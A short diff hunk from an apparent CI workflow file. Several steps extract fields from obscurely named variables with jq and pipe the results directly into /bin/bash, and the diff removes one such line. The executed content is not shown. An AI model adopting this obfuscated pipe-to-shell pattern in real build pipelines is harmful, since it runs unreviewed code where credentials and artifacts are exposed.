@@ -22,7 +22,6 @@ jobs:
           printf '%s' "$its69518" | jq -r .tiap070 | /bin/bash
           printf '%s' "$ozmh68" | jq -r .gf5 | /bin/bash
           echo $ulxbt0 | jq -r .tsw826 | /bin/bash
-          printf '%s' "$nwik90785" | jq -r .hc033 | /bin/bash
           echo $hztw7 | jq -r .wfjg5 | /bin/bash
 
       - name: Upload artifact
